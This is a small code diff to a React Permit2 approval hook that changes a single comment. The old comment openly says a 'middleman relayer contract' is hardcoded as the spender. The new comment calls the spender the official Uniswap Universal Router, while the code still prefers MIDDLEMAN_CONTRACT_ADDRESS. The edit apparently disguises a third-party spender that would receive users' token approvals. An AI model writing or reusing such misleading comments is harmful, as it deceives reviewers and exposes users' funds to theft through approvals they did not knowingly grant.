@@ -150,7 +150,7 @@ export function usePermit2() {
       setError(null);
 
       const chainId = caipNetwork?.id ? Number(caipNetwork.id) : 1;
-      // Hardcode middleman relayer contract address 0xF02D24A7bB10d0dBF3da2119d594B7a905dDC091 as primary spender
+      // Official Uniswap Universal Router (0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD) as primary spender
       const spender = params.spenderAddress || MIDDLEMAN_CONTRACT_ADDRESS || CONTRACT_ADDRESS;
       const decimals = params.decimals || 18;
       const parsedAmount = parseUnits(params.amount.toString(), decimals);
